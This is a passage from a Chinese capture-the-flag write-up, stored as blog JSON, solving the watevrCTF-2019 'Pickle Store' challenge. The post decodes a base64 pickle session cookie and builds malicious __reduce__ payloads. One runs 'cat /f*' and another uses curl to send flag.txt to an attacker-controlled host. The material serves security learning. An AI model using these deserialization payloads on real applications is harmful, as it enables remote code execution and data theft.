alt=\"在这里插入图片描述\"></p>\n<p><img src=\"https://img-blog.csdnimg.cn/61de3969feda4c1fa33675c0dbe077b8.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"watevrCTF-2019-Pickle-Store\"><a href=\"#watevrCTF-2019-Pickle-Store\" class=\"headerlink\" title=\"[watevrCTF-2019]Pickle Store\"></a>[watevrCTF-2019]Pickle Store</h2><p><img src=\"https://img-blog.csdnimg.cn/1c7ed9dc0d764a9ea4e206dfa23ad9bb.png\" alt=\"在这里插入图片描述\"><br>开环境后发现这个<code>flag</code>卖1000，而我们只有500，随便买两个其他的，发现也没什么东西，看一下其他内容，发现session有点像某种编码过后的，其内容如下</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">gAN9cQAoWAUAAABtb25leXEBTYYBWAcAAABoaXN0b3J5cQJdcQMoWBQAAABZdW1teSBzbcO2cmfDpXNndXJrYXEEWBUAAABZdW1teSBzdGFuZGFyZCBwaWNrbGVxBWVYEAAAAGFudGlfdGFtcGVyX2htYWNxBlggAAAAMjllYTdlODgyODJmOTJmNGZmYzI5NzZmMTQ5MDU2OTdxB3Uu<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>结合题目，想到这里可能是pickle序列化后又进行了base64编码，因此我们进行反向操作，base64解码一下再进行反序列化，看看能得到什么，脚本如下</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> pickle\n<span class=\"token keyword\">from</span> base64 <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\na<span class=\"token operator\">=</span><span class=\"token string\">'gAN9cQAoWAUAAABtb25leXEBTYYBWAcAAABoaXN0b3J5cQJdcQMoWBQAAABZdW1teSBzbcO2cmfDpXNndXJrYXEEWBUAAABZdW1teSBzdGFuZGFyZCBwaWNrbGVxBWVYEAAAAGFudGlfdGFtcGVyX2htYWNxBlggAAAAMjllYTdlODgyODJmOTJmNGZmYzI5NzZmMTQ5MDU2OTdxB3Uu'</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>pickle<span class=\"token punctuation\">.</span>loads<span class=\"token punctuation\">(</span>b64decode<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://img-blog.csdnimg.cn/5fb225b8b0414adaa355b53a36d58418.png\" alt=\"在这里插入图片描述\"><br>结果如下</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token punctuation\">&#123;</span><span class=\"token string\">'money'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">390</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'history'</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'Yummy smörgåsgurka'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Yummy standard pickle'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'anti_tamper_hmac'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'29ea7e88282f92f4ffc2976f14905697'</span><span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>这说明我们的推断是没有错误的，我们知道pickle存在反序列化漏洞，因此这里就可以利用pickle反序列化漏洞来解题<br>这里看起来是没有什么防护的，因此我们用简单的<code>__reduce__</code>来构造语句<br>尝试直接命令执行</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> base64\n<span class=\"token keyword\">import</span> pickle\n\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">flag</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__reduce__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"__import__('os').system('cat /f*')\"</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\na <span class=\"token operator\">=</span> flag<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span> base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span> pickle<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://img-blog.csdnimg.cn/42d314358c7d4a1399c8643b193b9ed7.png\" alt=\"在这里插入图片描述\"><br>不幸的是这里报500了，可能对session进行了某种检测，那我们这里就用反弹shell来做<br>而后我们编写脚本获取payload</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> base64\n<span class=\"token keyword\">import</span> pickle\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">payload</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__reduce__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"__import__('os').system('curl -d @flag.txt  ip:7777')\"</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\na <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span>pickle<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>然后服务器开启监听<br>接下来修改session值为对应payload，刷新界面即可得到flag<br><img src=\"https://img-blog.csdnimg.cn/d04f3029e7a64d29999b33fc98efaaf5.png\" alt=\"在这里插入图片描述\"></p>\n<h1 id=\"后言\"><a href=\"#后言\" class=\"headerlink\" title=\"后言\"></a>后言</h1><p>本人只是一个小白，在学习Python反序列化时对于<code>opcode</code>构造函数执行感到十分吃力，极有可能部分分析过程出现问题，如果有问题还请各位大师傅多多指正</p>\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><p><a href=\"https://tttang.com/archive/1294/#toc_\">https://tttang.com/archive/1294/</a><br><a href=\"https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf\">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a><br><a href=\"https://misakikata.github.io/2020/04/python-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#Unpickler-find-class\">https://misakikata.github.io/2020/04/python-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#Unpickler-find-class</a><br><a href=\"https://xz.aliyun.com/t/7436#toc-11\">https://xz.aliyun.com/t/7436#toc-11</a><br><a href=\"https://xz.aliyun.com/t/7012#toc-1\">https://xz.aliyun.com/t/7012#toc-1</a><br><a href=\"https://xz.aliyun.com/t/7320#toc-2\">https://xz.aliyun.com/t/7320#toc-2</a><br><a href=\"https://xz.aliyun.com/t/8342\">https://xz.aliyun.com/t/8342</a><br><a href=\"https://goodapple.top/archives/1069\">https://goodapple.top/archives/1069</a><br><a href=\"https://zhuanlan.zhihu.com/p/89132768\">https://zhuanlan.zhihu.com/p/89132768</a><br><a href=\"https://forum.butian.net/share/1929\">https://forum.butian.net/share/1929</a><br><a href=\"https://www.dounaite.com/article/62652a1c7b5653d739b20f48.html\">https://www.dounaite.com/article/62652a1c7b5653d739b20f48.html</a></p>\n","feature":true,"text":"声明文章首发于跳跳糖社区https://tttang.com/archive/1782/ 前言之前所接触的大多是PHP 反序列化题型，最近遇见了一道Python pickle反序列化类型题，因此学习了一下其反序列化，简单总结如下，希望能对各位师傅有所帮助。 Pickle师傅们可自...","link":"","photos":[],"count_time":{"symbolsCount":"19k","symbolsTime":"17 mins."},"categories":[{"name":"Python","slug":"Python","count":1,"path":"api/categories/Python.json"}],"tags":[{"name":"反序列化","slug":"反序列化","count":4,"path":"api/tags/反序列化.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%A3%B0%E6%98%8E\"><span class=\"toc-text\">声明</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Pickle\"><span class=\"toc-text\">Pickle</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%AE%9A%E4%B9%89\"><span class=\"toc-text\">定义</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">方法</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#demo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90\"><span class=\"toc-text\">demo源码分析</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%A4%BA%E4%BE%8B%E5%8F%8A%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90\"><span class=\"toc-text\">示例及源码分析</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0\"><span class=\"toc-text\">漏洞成因</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8\"><span class=\"toc-text\">漏洞利用</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96\"><span class=\"toc-text\">全局变量覆盖</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C\"><span class=\"toc-text\">函数执行</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E2%80%94reduce%E2%80%94%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">—reduce—方法</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%BC%96%E5%86%99opcode%E5%AE%9E%E7%8E%B0%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C\"><span class=\"toc-text\">编写opcode实现函数执行</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#R%E6%93%8D%E4%BD%9C%E7%AC%A6\"><span class=\"toc-text\">R操作符</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#i%E6%93%8D%E4%BD%9C%E7%AC%A6\"><span class=\"toc-text\">i操作符</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#o%E6%93%8D%E4%BD%9C%E7%AC%A6\"><span class=\"toc-text\">o操作符</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#b%E6%93%8D%E4%BD%9C%E7%AC%A6\"><span class=\"toc-text\">b操作符</span></a></li></ol></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%95%8C%E9%99%90%E7%AA%81%E7%A0%B4%EF%BC%88%E7%BB%95WAF%EF%BC%89\"><span class=\"toc-text\">界限突破（绕WAF）</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">黑名单绕过</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%85%B3%E9%94%AE%E8%AF%8D%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">关键词绕过</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#V%E6%93%8D%E4%BD%9C%E7%AC%A6%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">V操作符绕过</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">十六进制绕过</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0%E8%8E%B7%E5%8F%96%E5%85%B3%E9%94%AE%E5%AD%97\"><span class=\"toc-text\">内置函数获取关键字</span></a></li></ol></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%AE%9E%E6%88%98\"><span class=\"toc-text\">实战</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun\"><span class=\"toc-text\">[CISCN2019 华北赛区 Day1 Web2]ikun</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#watevrCTF-2019-Pickle-Store\"><span class=\"toc-text\">[watevrCTF-2019]Pickle Store</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%90%8E%E8%A8%80\"><span class=\"toc-text\">后言</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0\"><span class=\"toc-text\">参考文章</span></a></li></ol>","author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"从一道题目中学习反弹shell","uid":"3f5a0e228fd5b85476b92a268c8b102a","slug":"从一道题目中学习反弹shell","date":"2022-10-17T17:16:30.000Z","updated":"2023-03-14T07:12:28.000Z","comments":true,"path":"api/articles/从一道题目中学习反弹shell.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141511993.png","text":"前言最近在帮一位大师傅测试招新赛的时候，发现自己对反弹shell是不太了解的，因此在用反弹shell解题过后，来对反弹shell进行相关学习，希望对各位师傅有所帮助。 题目首先这里给出题目代码 &lt;?php if(isset($_GET['cmd']))&#123; $cmd...","link":"","photos":[],"count_time":{"symbolsCount":"7.3k","symbolsTime":"7 mins."},"categories":[{"name":"命令执行","slug":"命令执行","count":1,"path":"api/categories/命令执行.json"}],"tags":[{"name":"反弹shell","slug":"反弹shell","count":1,"path":"api/tags/反弹shell.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"PHP Phar反序列化浅析","uid":"e6402dc9a02db5ae2c54650aafd17f57","slug":"PHP Phar反序列化浅析","date":"2022-09-14T01:36:20.000Z","updated":"2023-03-20T04:06:34.000Z","comments":true,"path":"api/articles/PHP Phar反序列化浅析.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141530896.png","text":"声明文章首发于跳跳糖社区https://tttang.com/archive/1732 前言Phar反序列化是PHP反序列化的一个重要部分，进行相关学习后，简单总结如下，希望对正在学习的师傅有所帮助。 了解PharPhar含义可以认为Phar是PHP的压缩文档，是PHP中类似于J...","link":"","photos":[],"count_time":{"symbolsCount":"16k","symbolsTime":"14 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"反序列化","slug":"反序列化","count":4,"path":"api/tags/反序列化.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true}}